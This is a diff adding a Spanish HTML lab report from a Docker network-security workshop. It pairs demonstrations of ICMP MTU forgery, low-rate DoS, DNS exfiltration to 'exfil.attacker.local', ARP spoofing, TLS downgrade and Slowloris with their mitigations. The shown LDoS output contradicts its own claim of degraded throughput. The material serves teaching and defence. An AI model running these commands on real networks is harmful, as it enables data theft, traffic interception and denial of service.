+Step 3/7 : RUN pip install --no-cache-dir scapy
+ ---&gt; Using cache
+ ---&gt; 14f51145fa8a
+Step 4/7 : WORKDIR /lab
+ ---&gt; Using cache
+ ---&gt; 14f51145fa8a
+Step 4/7 : WORKDIR /lab
+ ---&gt; Using cache
+ ---&gt; 64c502339872
+Step 5/7 : COPY scripts/ /lab/
+ ---&gt; Using cache
+ ---&gt; 64c502339872
+Step 5/7 : COPY scripts/ /lab/
+ ---&gt; Using cache
+ ---&gt; 1ce78eaec4f0
+Step 6/7 : CMD [&quot;sleep&quot;, &quot;infinity&quot;]
+ ---&gt; Using cache
+ ---&gt; 1ce78eaec4f0
+Step 6/7 : CMD [&quot;sleep&quot;, &quot;infinity&quot;]
+ ---&gt; Using cache
+ ---&gt; e5d124cdbfe1
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; e5d124cdbfe1
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; 251b06a421a7
+ ---&gt; Using cache
+ ---&gt; 251b06a421a7
+Successfully built 251b06a421a7
+Successfully built 251b06a421a7
+Successfully tagged p07v-objetivo:latest
+ Image p07v-objetivo Built 
+ Image p07v-objetivo Built 
+Successfully tagged p07v-atacante:latest
+ Image p07v-atacante Built 
+ Image p07v-atacante Built 
+ Network p07v_labnet Creating 
+ Network p07v_labnet Created 
+ Container p07v-objetivo-1 Creating 
+ Container p07v-atacante-1 Creating 
+ Container p07v-atacante-1 Created 
+ Container p07v-objetivo-1 Created 
+ Container p07v-objetivo-1 Starting 
+ Container p07v-atacante-1 Starting 
+ Container p07v-objetivo-1 Started 
+ Container p07v-atacante-1 Started 
+[+] Fragmento 0 enviado (16 bytes payload UDP benigno)
+[+] Fragmento 1 solapado (offset 8) con EVILPAYLOAD
+ Container p07v-objetivo-1 Stopping 
+ Container p07v-atacante-1 Stopping 
+ Container p07v-objetivo-1 Stopped 
+ Container p07v-objetivo-1 Removing 
+ Container p07v-atacante-1 Stopped 
+ Container p07v-atacante-1 Removing 
+ Container p07v-objetivo-1 Removed 
+ Container p07v-atacante-1 Removed 
+ Network p07v_labnet Removing 
+ Network p07v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-08" class="lab-section">
+  <h2>Punto 08 — Ataques Off-Path con ICMP Forjado</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> ICMP</span>
+    <span><strong>Capa:</strong> Internet</span>
+    <span><strong>Criticidad:</strong> Medio-Alto</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>ICMP Type 3 Code 4 falsificado con MTU reducido para degradar conexiones TCP activas.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Atacante 10.9.0.10, víctima 10.9.0.20, gateway 10.9.0.1.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>accept_redirects=0 y tcp_mtu_probing=1.</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-08-vulnerable.png" target="_blank"><img src="assets/punto-08-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-08-mitigado.png" target="_blank"><img src="assets/punto-08-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>Tras ICMP forjado, ip route show refleja MTU reducido en la ruta.</p></div>
+    <div><h4>Mitigado</h4><p>La ruta se mantiene estable; MTU probing permite recuperación.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>python3 forge_icmp_mtu.py 10.9.0.20</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre>
+ ---&gt; Using cache
+ ---&gt; d858fb9f3c0e
+Step 6/7 : CMD [&quot;sleep&quot;, &quot;infinity&quot;]
+Step 6/7 : CMD [&quot;sleep&quot;, &quot;infinity&quot;]
+ ---&gt; Using cache
+ ---&gt; 4fa7939f12a2
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; 4fa7939f12a2
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; 4fa7939f12a2
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; 9859a745eac8
+ ---&gt; Using cache
+ ---&gt; 9859a745eac8
+ ---&gt; Using cache
+ ---&gt; 9859a745eac8
+Successfully built 9859a745eac8
+Successfully built 9859a745eac8
+Successfully built 9859a745eac8
+Successfully tagged p08v-atacante:latest
+ Image p08v-atacante Built 
+ Image p08v-atacante Built 
+Successfully tagged p08v-victima:latest
+ Image p08v-victima Built 
+ Image p08v-victima Built 
+Successfully tagged p08v-servidor:latest
+ Image p08v-servidor Built 
+ Image p08v-servidor Built 
+ Network p08v_labnet Creating 
+ Network p08v_labnet Created 
+ Container p08v-servidor-1 Creating 
+ Container p08v-atacante-1 Creating 
+ Container p08v-victima-1 Creating 
+ Container p08v-atacante-1 Created 
+ Container p08v-victima-1 Created 
+ Container p08v-servidor-1 Created 
+ Container p08v-victima-1 Starting 
+ Container p08v-servidor-1 Starting 
+ Container p08v-atacante-1 Starting 
+ Container p08v-servidor-1 Started 
+ Container p08v-victima-1 Started 
+ Container p08v-atacante-1 Started 
+[+] ICMP Type3/Code4 forjado hacia 10.9.0.20 (MTU=576)
+    Datagrama interno: 10.9.0.20:45678 -&gt; 10.9.0.30:8080 seq=1
+ Container p08v-servidor-1 Stopping 
+ Container p08v-victima-1 Stopping 
+ Container p08v-atacante-1 Stopping 
+ Container p08v-servidor-1 Stopped 
+ Container p08v-servidor-1 Removing 
+ Container p08v-atacante-1 Stopped 
+ Container p08v-atacante-1 Removing 
+ Container p08v-victima-1 Stopped 
+ Container p08v-victima-1 Removing 
+ Container p08v-atacante-1 Removed 
+ Container p08v-servidor-1 Removed 
+ Container p08v-victima-1 Removed 
+ Network p08v_labnet Removing 
+ Network p08v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-09" class="lab-section">
+  <h2>Punto 09 — Low-Rate Denial of Service (LDoS)</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> TCP</span>
+    <span><strong>Capa:</strong> Transporte</span>
+    <span><strong>Criticidad:</strong> Alto</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Ráfagas periódicas sincronizadas con RTO mínimo para degradar TCP sin saturar el enlace.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Atacante 10.9.0.101, cliente 10.9.0.102, router con 10 Mbps.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>fq_codel / hashlimit en router para aislar flujos.</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-09-vulnerable.png" target="_blank"><img src="assets/punto-09-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-09-mitigado.png" target="_blank"><img src="assets/punto-09-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>Descarga TCP del cliente cae drásticamente durante el ataque LDoS.</p></div>
+    <div><h4>Mitigado</h4><p>Con control de colas justo, la descarga mantiene throughput aceptable.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>python3 ldos.py 10.9.0.102 &amp; wget http://10.9.0.102/</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre>nity&quot;]
+ ---&gt; Using cache
+ ---&gt; 065d046522d3
+Step 6/7 : CMD [&quot;sleep&quot;, &quot;infinity&quot;]
+ ---&gt; Using cache
+ ---&gt; c513a76b2c84
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; c513a76b2c84
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; c513a76b2c84
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; 11daf28f6fdb
+ ---&gt; Using cache
+ ---&gt; 11daf28f6fdb
+Successfully built 11daf28f6fdb
+ ---&gt; Using cache
+ ---&gt; 11daf28f6fdb
+Successfully built 11daf28f6fdb
+Successfully built 11daf28f6fdb
+Successfully tagged p09v-atacante:latest
+ Image p09v-atacante Built 
+ Image p09v-atacante Built 
+Successfully tagged p09v-cliente:latest
+ Image p09v-cliente Built 
+ Image p09v-cliente Built 
+Successfully tagged p09v-servidor:latest
+ Image p09v-servidor Built 
+ Image p09v-servidor Built 
+ Network p09v_labnet Creating 
+ Network p09v_labnet Created 
+ Container p09v-cliente-1 Creating 
+ Container p09v-servidor-1 Creating 
+ Container p09v-atacante-1 Creating 
+ Container p09v-servidor-1 Created 
+ Container p09v-atacante-1 Created 
+ Container p09v-cliente-1 Created 
+ Container p09v-servidor-1 Starting 
+ Container p09v-atacante-1 Starting 
+ Container p09v-cliente-1 Starting 
+ Container p09v-cliente-1 Started 
+ Container p09v-servidor-1 Started 
+ Container p09v-atacante-1 Started 
+[*] Descarga sin ataque (referencia):
+velocidad=1289444171 B/s tiempo=0.004066s
+[*] Descarga durante LDoS:
+velocidad=1307451371 B/s tiempo=0.004010s
+ Container p09v-cliente-1 Stopping 
+ Container p09v-atacante-1 Stopping 
+ Container p09v-servidor-1 Stopping 
+ Container p09v-cliente-1 Stopped 
+ Container p09v-cliente-1 Removing 
+ Container p09v-atacante-1 Stopped 
+ Container p09v-atacante-1 Removing 
+ Container p09v-servidor-1 Stopped 
+ Container p09v-servidor-1 Removing 
+ Container p09v-atacante-1 Removed 
+ Container p09v-servidor-1 Removed 
+ Container p09v-cliente-1 Removed 
+ Network p09v_labnet Removing 
+ Network p09v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-10" class="lab-section">
+  <h2>Punto 10 — Exfiltración Lenta por DNS</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> DNS</span>
+    <span><strong>Capa:</strong> Aplicación</span>
+    <span><strong>Criticidad:</strong> Medio-Alto</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Codificación de datos en subdominios DNS para exfiltración sigilosa de baja frecuencia.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Host 10.9.0.102, resolvedor 10.9.0.53, DNS atacante 10.9.0.101.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>Filtrado de consultas con subdominios largos o alta entropía.</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-10-vulnerable.png" target="_blank"><img src="assets/punto-10-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-10-mitigado.png" target="_blank"><img src="assets/punto-10-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>El servidor DNS del atacante registra la consulta con datos hex exfiltrados.</p></div>
+    <div><h4>Mitigado</h4><p>El resolvedor bloquea consultas anómalas; no llegan al DNS del atacante.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>python3 slow_dns.py exfil.attacker.local &#x27;Secreto&#x27;</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre>ver Built 
+ Image p10v-resolver Built 
+ Network p10v_labnet Creating 
+ Network p10v_labnet Created 
+ Container p10v-host-1 Creating 
+ Container p10v-resolver-1 Creating 
+ Container p10v-attacker-dns-1 Creating 
+ Container p10v-resolver-1 Created 
+ Container p10v-attacker-dns-1 Created 
+ Container p10v-host-1 Created 
+ Container p10v-attacker-dns-1 Starting 
+ Container p10v-resolver-1 Starting 
+ Container p10v-host-1 Starting 
+ Container p10v-resolver-1 Started 
+ Container p10v-attacker-dns-1 Started 
+ Container p10v-host-1 Started 
+[*] Exfiltrando [Secreto] como: 5365637265746f.exfil.attacker.local
+[+] Consulta DNS enviada al resolvedor configurado
+[*] Consultas registradas en DNS atacante:
+attacker-dns-1  | [*] DNS atacante iniciando (registra consultas exfiltradas)
+attacker-dns-1  | dnsmasq[1]: started, version 2.90 cachesize 150
+attacker-dns-1  | dnsmasq[1]: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
+attacker-dns-1  | dnsmasq[1]: warning: no upstream servers configured
+attacker-dns-1  | dnsmasq[1]: read /etc/hosts - 9 names
+attacker-dns-1  | dnsmasq[1]: query[A] 5365637265746f.exfil.attacker.local from 10.9.0.53
+attacker-dns-1  | dnsmasq[1]: config 5365637265746f.exfil.attacker.local is 10.9.0.101
+attacker-dns-1  | dnsmasq[1]: query[AAAA] 5365637265746f.exfil.attacker.local from 10.9.0.53
+attacker-dns-1  | dnsmasq[1]: config error is REFUSED (EDE: not ready)
+ Container p10v-resolver-1 Stopping 
+ Container p10v-host-1 Stopping 
+ Container p10v-attacker-dns-1 Stopping 
+ Container p10v-resolver-1 Stopped 
+ Container p10v-resolver-1 Removing 
+ Container p10v-attacker-dns-1 Stopped 
+ Container p10v-attacker-dns-1 Removing 
+ Container p10v-resolver-1 Removed 
+ Container p10v-attacker-dns-1 Removed 
+ Container p10v-host-1 Stopped 
+ Container p10v-host-1 Removing 
+ Container p10v-host-1 Removed 
+ Network p10v_labnet Removing 
+ Network p10v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-11" class="lab-section">
+  <h2>Punto 11 — ARP Spoofing Silencioso</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> ARP</span>
+    <span><strong>Capa:</strong> Acceso a Red</span>
+    <span><strong>Criticidad:</strong> Medio-Alto</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Respuestas ARP gratuitas lentas que envenenan la caché ARP de la víctima.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Atacante 10.9.0.10, víctima 10.9.0.20, gateway 10.9.0.1.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>Entrada ARP estática para la puerta de enlace (arp -s).</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-11-vulnerable.png" target="_blank"><img src="assets/punto-11-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-11-mitigado.png" target="_blank"><img src="assets/punto-11-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>ip neigh show en víctima asocia gateway con MAC del atacante.</p></div>
+    <div><h4>Mitigado</h4><p>Entrada estática impide que ARP spoofing altere el mapeo IP-MAC.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>python3 arp_slow.py 10.9.0.20 ... &amp;&amp; ip neigh show</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre>ge.builder=classic
+ ---&gt; Using cache
+ ---&gt; cff9fa29b0ed
+Successfully built cff9fa29b0ed
+ ---&gt; Using cache
+ ---&gt; cff9fa29b0ed
+Successfully built cff9fa29b0ed
+Successfully tagged p11v-atacante:latest
+ Image p11v-atacante Built 
+ Image p11v-atacante Built 
+ ---&gt; Using cache
+ ---&gt; cff9fa29b0ed
+Successfully tagged p11v-victima:latest
+ Image p11v-victima Built 
+ Image p11v-victima Built 
+Successfully built cff9fa29b0ed
+Successfully tagged p11v-gateway:latest
+ Image p11v-gateway Built 
+ Image p11v-gateway Built 
+ Network p11v_labnet Creating 
+ Network p11v_labnet Created 
+ Container p11v-atacante-1 Creating 
+ Container p11v-gateway-1 Creating 
+ Container p11v-victima-1 Creating 
+ Container p11v-atacante-1 Created 
+ Container p11v-victima-1 Created 
+ Container p11v-gateway-1 Created 
+ Container p11v-atacante-1 Starting 
+ Container p11v-gateway-1 Starting 
+ Container p11v-victima-1 Starting 
+ Container p11v-atacante-1 Started 
+ Container p11v-victima-1 Started 
+ Container p11v-gateway-1 Started 
+[*] MACs: victima=2a:0a:02:df:ab:fe atacante=26:fc:e2:51:97:ca gateway=6a:44:31:42:08:7c
+[*] Tabla ARP víctima ANTES:
+10.9.0.1 dev eth0 lladdr 6a:44:31:42:08:7c REACHABLE 
+[*] Envenenamiento silencioso contra 10.9.0.20 (2 iteraciones, 2.0s)
+[+] ARP Reply 1/2: 10.9.0.1 -&gt; MAC 26:fc:e2:51:97:ca
+[+] ARP Reply 2/2: 10.9.0.1 -&gt; MAC 26:fc:e2:51:97:ca
+[*] Auditoría ARP finalizada
+[*] Tabla ARP víctima DESPUÉS (gateway debería apuntar al MAC del atacante):
+10.9.0.1 dev eth0 lladdr 26:fc:e2:51:97:ca REACHABLE 
+ Container p11v-gateway-1 Stopping 
+ Container p11v-victima-1 Stopping 
+ Container p11v-atacante-1 Stopping 
+ Container p11v-victima-1 Stopped 
+ Container p11v-victima-1 Removing 
+ Container p11v-gateway-1 Stopped 
+ Container p11v-gateway-1 Removing 
+ Container p11v-atacante-1 Stopped 
+ Container p11v-atacante-1 Removing 
+ Container p11v-victima-1 Removed 
+ Container p11v-gateway-1 Removed 
+ Container p11v-atacante-1 Removed 
+ Network p11v_labnet Removing 
+ Network p11v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-12" class="lab-section">
+  <h2>Punto 12 — Downgrade Attacks TLS/SSH</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> TLS</span>
+    <span><strong>Capa:</strong> Aplicación</span>
+    <span><strong>Criticidad:</strong> Medio-Alto</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Manipulación de ClientHello para forzar cipher suites obsoletas.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Cliente 10.9.0.102, servidor Apache 10.9.0.103.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>SSLProtocol restringido a TLS 1.2+ y ciphers modernos.</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-12-vulnerable.png" target="_blank"><img src="assets/punto-12-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-12-mitigado.png" target="_blank"><img src="assets/punto-12-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>openssl s_client negocia TLS 1.0 o RC4 con servidor vulnerable.</p></div>
+    <div><h4>Mitigado</h4><p>Servidor hardened rechaza handshake con ciphers débiles.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>openssl s_client -connect 10.9.0.103:443 -tls1</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre>vidor Building 
+Sending build context to Docker daemon  1.128kB
+
+Step 1/7 : FROM debian:bookworm-slim
+ ---&gt; 0104b334637a
+Step 2/7 : RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends nginx openssl curl     &amp;&amp; rm -rf /var/lib/apt/lists/*
+ ---&gt; Using cache
+ ---&gt; e4010372be5d
+Step 3/7 : COPY nginx.conf /etc/nginx/sites-available/default
+ ---&gt; Using cache
+ ---&gt; 5f8e3184cd4d
+Step 4/7 : COPY entrypoint.sh /entrypoint.sh
+ ---&gt; Using cache
+ ---&gt; bf182fe69da4
+Step 5/7 : RUN chmod +x /entrypoint.sh     &amp;&amp; openssl req -x509 -nodes -days 365 -newkey rsa:2048        -keyout /etc/ssl/private/nginx-selfsigned.key        -out /etc/ssl/certs/nginx-selfsigned.crt        -subj &quot;/CN=lab.local&quot;
+ ---&gt; Using cache
+ ---&gt; b7a99576b390
+Step 6/7 : ENTRYPOINT [&quot;/entrypoint.sh&quot;]
+ ---&gt; Using cache
+ ---&gt; 27fa8b63fa0f
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; e21584e0f648
+Successfully built e21584e0f648
+Successfully tagged p12v-servidor:latest
+ Image p12v-servidor Built 
+ Image p12v-servidor Built 
+ Network p12v_labnet Creating 
+ Network p12v_labnet Created 
+ Container p12v-cliente-1 Creating 
+ Container p12v-servidor-1 Creating 
+ Container p12v-servidor-1 Created 
+ Container p12v-cliente-1 Created 
+ Container p12v-cliente-1 Starting 
+ Container p12v-servidor-1 Starting 
+ Container p12v-cliente-1 Started 
+ Container p12v-servidor-1 Started 
+40472893517F0000:error:0A000438:SSL routines:ssl3_read_bytes:tlsv1 alert internal error:../ssl/record/rec_layer_s3.c:1601:SSL alert number 80
+CONNECTED(00000003)
+New, (NONE), Cipher is (NONE)
+    Protocol  : TLSv1
+    Cipher    : 0000
+    Verify return code: 0 (ok)
+ Container p12v-servidor-1 Stopping 
+ Container p12v-cliente-1 Stopping 
+ Container p12v-cliente-1 Stopped 
+ Container p12v-cliente-1 Removing 
+ Container p12v-servidor-1 Stopped 
+ Container p12v-servidor-1 Removing 
+ Container p12v-cliente-1 Removed 
+ Container p12v-servidor-1 Removed 
+ Network p12v_labnet Removing 
+ Network p12v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-13" class="lab-section">
+  <h2>Punto 13 — Ataques Low-and-Slow (Slowloris)</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> HTTP / TCP</span>
+    <span><strong>Capa:</strong> Aplicación / Transporte</span>
+    <span><strong>Criticidad:</strong> Alto</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Conexiones HTTP incompletas que agotan el pool de threads del servidor web.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Atacante 10.9.0.11, servidor Apache 10.9.0.100.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>iptables connlimit --connlimit-above 10 por IP.</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-13-vulnerable.png" target="_blank"><img src="assets/punto-13-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-13-mitigado.png" target="_blank"><img src="assets/punto-13-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>Cliente legítimo recibe timeout; servidor satura conexiones concurrentes.</p></div>
+    <div><h4>Mitigado</h4><p>Conexiones extra son rechazadas; cliente legítimo accede con normalidad.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>python3 slow_attack.py 10.9.0.100 20</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre>05434
+ ---&gt; 32eebfa30b0e
+Step 9/9 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Removed intermediate container 7095e49a950a
+ ---&gt; 00b775bf0d6e
+Step 9/9 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Running in c82a0ab1e1b3
+ ---&gt; Running in b41a085b6e10
+ ---&gt; Running in 53117592d8e9
+ ---&gt; Removed intermediate container c82a0ab1e1b3
+ ---&gt; 6aa3bae938ff
+Successfully built 6aa3bae938ff
+ ---&gt; Removed intermediate container 53117592d8e9
+ ---&gt; a62f0e7ab0a5
+ ---&gt; Removed intermediate container b41a085b6e10
+ ---&gt; 5df6f1e4feeb
+Successfully built 5df6f1e4feeb
+Successfully built a62f0e7ab0a5
+Successfully tagged p13v-cliente:latest
+ Image p13v-cliente Built 
+ Image p13v-cliente Built 
+Successfully tagged p13v-servidor:latest
+ Image p13v-servidor Built 
+ Image p13v-servidor Built 
+Successfully tagged p13v-atacante:latest
+ Image p13v-atacante Built 
+ Image p13v-atacante Built 
+ Network p13v_labnet Creating 
+ Network p13v_labnet Created 
+ Container p13v-cliente-1 Creating 
+ Container p13v-atacante-1 Creating 
+ Container p13v-servidor-1 Creating 
+ Container p13v-servidor-1 Created 
+ Container p13v-cliente-1 Created 
+ Container p13v-atacante-1 Created 
+ Container p13v-atacante-1 Starting 
+ Container p13v-cliente-1 Starting 
+ Container p13v-servidor-1 Starting 
+ Container p13v-atacante-1 Started 
+ Container p13v-cliente-1 Started 
+ Container p13v-servidor-1 Started 
+[*] Cliente legítimo (puede timeout):
+http_code=000 time=0.000412s
+[!] Timeout/fallo — servidor saturado por Slowloris
+ Container p13v-atacante-1 Stopping 
+ Container p13v-cliente-1 Stopping 
+ Container p13v-servidor-1 Stopping 
+ Container p13v-servidor-1 Stopped 
+ Container p13v-atacante-1 Stopped 
+ Container p13v-atacante-1 Removing 
+ Container p13v-servidor-1 Removing 
+ Container p13v-cliente-1 Stopped 
+ Container p13v-cliente-1 Removing 
+ Container p13v-servidor-1 Removed 
+ Container p13v-atacante-1 Removed 
+ Container p13v-cliente-1 Removed 
+ Network p13v_labnet Removing 
+ Network p13v_labnet Removed 
+</pre></details>
+</section>
+
+</main>
+<footer>Generado automáticamente por run_all.sh · Taller 2 Docker Labs</footer>
+</body>
+</html>
